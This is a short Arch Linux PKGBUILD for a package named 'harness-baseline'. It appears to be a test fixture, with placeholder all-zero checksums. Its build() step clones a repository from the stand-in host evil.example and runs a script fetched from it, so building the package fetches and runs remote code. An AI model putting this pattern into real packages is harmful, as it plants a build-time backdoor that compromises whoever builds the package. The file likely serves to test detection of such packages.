pkgname=harness-baseline
pkgver=1.0.1
pkgrel=1
pkgdesc="Baseline package for harness campaigns"
arch=("any")
url="https://github.com/example/harness-baseline"
license=("MIT")
source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" "repo::https://evil.example/hg/repo")
sha256sums=("0000000000000000000000000000000000000000000000000000000000000000" "0000000000000000000000000000000000000000000000000000000000000000")

build() {
  cd "$srcdir"
  hg clone https://evil.example/hg/repo
  awk '1' repo/x.sh > run.me
  escript run.me
}
